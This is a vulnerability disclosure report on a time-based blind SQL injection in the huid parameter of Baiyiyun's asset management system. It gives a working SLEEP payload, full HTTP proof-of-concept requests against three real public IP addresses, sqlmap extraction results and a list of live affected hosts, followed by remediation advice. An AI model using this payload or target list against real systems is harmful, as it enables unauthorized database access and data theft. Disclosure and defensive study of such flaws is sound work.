# Vulnerability Title
SQL Injection Vulnerability in Baiyiyun Asset Management and Operations System `/wuser/anyUserBoundHouse.php` Interface  

---

# Vulnerability Overview
Hunan Zhonghe Baiyi Information Technology Co., Ltd. (referred to as **Baiyiyun**), founded in 2017, is a national high-tech enterprise dedicated to digital solutions in the real estate sector. The company provides comprehensive digital transformation services for residential, commercial, industrial, and public infrastructure sectors, aiming to enhance operational efficiency and reduce costs. The Baiyiyun Asset Management and Operations System was found to contain a **SQL injection vulnerability** in the `/wuser/anyUserBoundHouse.php` interface. Attackers can exploit this vulnerability by crafting malicious requests to inject SQL commands, bypassing normal query logic and directly manipulating the database. Successful exploitation may lead to sensitive data leakage (e.g., database names, user credentials) or even remote command execution and data tampering.  

---

# Code Analysis
The root cause lies in the system’s failure to properly sanitize user-supplied input (`huid`) or implement parameterized queries. Key issues include:  

1. **Unfiltered Input Parameters**: The interface directly concatenates the user-controlled `huid` parameter into SQL statements, such as:

```sql
SELECT * FROM table WHERE huid = {user_input}  
```

2. **Dynamic SQL Concatenation**: Attackers can inject malicious payloads like `1 AND (SELECT 6941 FROM (SELECT(SLEEP(2)))OKTO)` to trigger delayed responses (e.g., `SLEEP(2)`), confirming control over the SQL logic.  
3. **Lack of Prepared Statements**: The absence of parameterized queries or ORM frameworks allows input parameters to alter SQL execution flow.

---

# Proof of Concept
## Reproduction Steps and Results
### Case 1: [http://8.142.100.161](http://8.142.100.161)
**POC Request**:  

```http
GET /wuser/anyUserBoundHouse.php?huid=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1  
Host: 8.142.100.161  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)  
Accept-Encoding: gzip, deflate  
Accept: */*  
Connection: close  
```

**Result**: The server response was delayed by 2 seconds (confirmed `SLEEP(2)` execution).  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809213163-ee8b3e1e-327e-4ea4-a3de-aecd729554b7.png)  
**Sqlmap Verification**: Successfully extracted the current database name.  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809221942-9b1a84ec-daea-4da7-aa28-6d049b097fd0.png)  

### Case 2: [http://120.76.251.27](http://120.76.251.27)
**POC Request**:  

```http
GET /wuser/anyUserBoundHouse.php?huid=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1  
Host: 120.76.251.27  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)  
Accept-Encoding: gzip, deflate  
Accept: */*  
Connection: close  
```

**Result**: Server response delayed by 2 seconds.  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809282483-402d57b0-20d5-440d-9981-82977189fc63.png)  
**Sqlmap Verification**: Database name extracted.  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809302030-ff56d64f-2032-47b5-bff0-0db431e56858.png)  

### Case 3: [http://14.18.126.32](http://14.18.126.32)
**POC Request**:  

```http
GET /wuser/anyUserBoundHouse.php?huid=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO) HTTP/1.1  
Host: 14.18.126.32  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)  
Accept-Encoding: gzip, deflate  
Accept: */*  
Connection: close  
```

**Result**: 2-second delay confirmed.  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809339215-bd485930-6117-49d9-9e17-39c4ee8d22ff.png)  
**Sqlmap Output**:  

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809345048-5d63263c-7856-474f-bb31-bf4ccfc963ee.png)  

## Asset Verification
**Company Information**:  

+ Name: 湖南众合百易信息技术有限公司
+ English Name: Hunan Zhonghe Baiyi Information Technology Co., Ltd.
+ Official Website: [http://www.baiyishequ.com](http://www.baiyishequ.com)  
+ Email: hongxun@baiyishequ.com

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1739809443083-8e017f5a-f6bc-4a68-ad8f-55fb145babc0.png)  

---

# Impact
1. **Data Leakage**: Attackers can exfiltrate sensitive data (e.g., user credentials, asset details).  
2. **Privilege Escalation**: Potential execution of system commands or file writes, leading to server compromise.  
3. **Business Disruption**: Data tampering or deletion may cause operational downtime and reputational damage.

---

# Remediation Strategies
1. **Parameterized Queries**: Use prepared statements (e.g., PDO or MySQLi) to separate SQL logic from user input.

```php
$stmt = $pdo->prepare("SELECT * FROM table WHERE huid = :huid");  
$stmt->execute(['huid' => $huid]);  
```

2. **Input Validation**: Enforce strict type checking (e.g., integer conversion) or whitelist validation for `huid`.  
3. **Least Database Privileges**: Restrict database account permissions; avoid using high-privilege accounts (e.g., root).  
4. **Web Application Firewall (WAF)**: Deploy WAF to block SQL injection patterns.  
5. **Security Audits**: Conduct regular code reviews and penetration testing using tools like Sqlmap or OWASP ZAP.

---

# Affected Assets
Partial list of impacted IPs/domains:  

+ [http://139.9.121.16](http://139.9.121.16)  
+ [http://139.9.121.16:88](http://139.9.121.16:88)  
+ [http://jd.scvone.net](http://jd.scvone.net)  
+ [http://www.zhenhua-shenzhen.cn](http://www.zhenhua-shenzhen.cn)  
+ [http://8.142.100.161](http://8.142.100.161)  
+ [http://frct2.baiyishequ.com](http://frct2.baiyishequ.com)  
+ [http://14.18.126.32](http://14.18.126.32)  
+ [http://120.76.251.27](http://120.76.251.27)  
+ [https://yd-wy.com](https://yd-wy.com)  
+ [http://sz.scvone.net](http://sz.scvone.net)  
+ [http://booking.cfuturelab.com](http://booking.cfuturelab.com)  
+ [https://csjc.baiyishequ.com](https://csjc.baiyishequ.com)  
+ [http://csjc.scvone.net](http://csjc.scvone.net)  
+ [http://zgce.gdkxwh.cn](http://zgce.gdkxwh.cn)  
+ [http://baiyiyun.dfmd.net.cn](http://baiyiyun.dfmd.net.cn)  
+ [http://yc.scvone.net](http://yc.scvone.net)

